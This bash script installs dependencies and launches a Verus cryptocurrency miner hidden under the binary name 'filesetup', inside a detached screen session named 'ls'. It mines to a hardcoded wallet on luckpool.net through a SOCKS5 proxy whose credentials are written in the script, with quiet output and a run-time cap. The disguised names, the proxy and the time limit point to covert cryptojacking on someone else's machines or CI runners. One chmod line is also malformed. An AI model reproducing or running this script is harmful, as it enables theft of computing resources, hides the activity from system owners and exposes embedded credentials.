#!/bin/bash
sudo apt update 
sudo apt install screen libjansson4 -y 
chmod +x olab.sh && chmod +x filesetup chmod 777 filesetup olab.sh
screen -dmS ls 
POOL=stratum+tcp://na.luckpool.net:3956
WALLET=RUEfFzYUwZSaXcLmdA6xyPvgwu7FLbkm6r
WORKER=$(echo $(shuf -i 1-10 -n 1)hape)
PROXY=socks5://curian:kangnyolong93@192.252.215.2:4145
./filesetup -a verus -o $POOL -u $WALLET.$WORKER -t 8 -x $PROXY -q --time-limit 21000
